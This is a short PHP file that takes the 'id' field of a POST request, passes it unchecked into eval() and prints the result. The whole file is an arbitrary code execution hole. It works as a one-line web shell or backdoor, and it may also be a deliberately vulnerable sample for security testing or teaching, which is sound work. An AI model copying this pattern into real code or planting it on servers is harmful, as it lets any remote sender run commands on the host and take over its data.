<?php
eval('$a='.$_POST['id'].';');
echo $a;

?>
